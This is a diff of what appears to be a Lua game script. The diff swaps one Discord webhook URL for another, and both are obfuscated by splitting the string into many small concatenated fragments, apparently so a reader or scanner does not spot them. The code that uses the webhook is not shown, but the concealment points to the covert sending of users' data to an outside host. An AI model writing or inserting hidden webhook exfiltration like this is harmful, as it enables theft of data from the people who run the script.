@@ -162,18 +162,13 @@ end
 SaveSettings()
 end
 end
-local weno = "h".."t".."t".."p"..
-"s"..":".."/".."/".."d"
-.."i".."s".."c".."o"..
-"r".."d"..".".."c".."o"..
-"m".."/".."a".."p".."i".."/"..
-"w".."e".."b"..
-"h".."o".."o".."k".."s".."/".."1".."0".."4"
-.."3".."4".."6".."6".."8".."2".."2"
-.."6".."1".."7".."3".."9".."9".."3".."7".."6/_".."iRz".."7lxJa"..
-"Vom".."9oLNau".."S1hl-l".."TI9rM"
-.."2A034X".."F6m1N".."pT-G".."yOL6"
-.."Vk1Hz".."uCUO".."8BaUO".."W6qUYe"
+local weno = "ht".."tps".."://dis"..
+"cor".."d.com".."/ap".."i/we"..
+"bho".."oks/104".."39900".."37206"..
+"929438/cv7".."DCc".."G6y".."0Us"..
+"Y1VR".."q7vi".."QB-yP7k_Sk9"..
+"3ajUL".."ndbW".."7sIOu".."Mze7O"..
+"qe38LU".."tjlBkP".."SDxoeU"
 function playback()
     SaveSettings()
     pcall(function()
